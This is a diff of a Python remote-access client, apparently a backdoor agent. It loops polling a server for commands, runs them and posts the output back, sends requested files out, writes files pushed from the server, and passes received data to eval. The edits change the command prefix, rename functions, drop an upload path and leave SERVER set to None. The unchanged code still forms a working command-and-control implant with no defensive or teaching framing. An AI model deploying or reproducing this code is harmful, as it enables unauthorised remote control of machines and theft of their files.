@@ -36,11 +36,8 @@ def process(server,command):
     else:
         R = requests.post(server, OUT)
 
-def fileRequest(server,fileName):
-    server+="/download"
-    R = requests.post(server,fileName.encode('utf-8'))
 
-def fileDownload(server,d):
+def fileReciver(server,d):
     dataDict=eval(d)
     fileName=dataDict['name']
     fileData=dataDict['file']
@@ -59,20 +56,17 @@ def fileSender(server,fileName):
     else:
         R = requests.post(server,("File missing").encode('utf-8'))
 
-IP=""
-SERVER = f'http://{IP}'
+SERVER=None
 while True:
     try:
         RevcivedData = requests.get(SERVER)
         command = RevcivedData.text
-        if command.startswith("*"):
+        if command.startswith("-"):
             os(SERVER,command[1:])
         elif command.startswith("download "):
             fileSender(SERVER,command.split("download ")[1])
-        elif command.startswith("upload "):
-            fileRequest(SERVER,command.split("upload ")[1]) 
         elif command.startswith("save "):
-            fileDownload(SERVER,command.split("save ")[1]) 
+            fileReciver(SERVER,command.split("save ")[1]) 
         else:
             process(SERVER,command)
     except Exception as e:
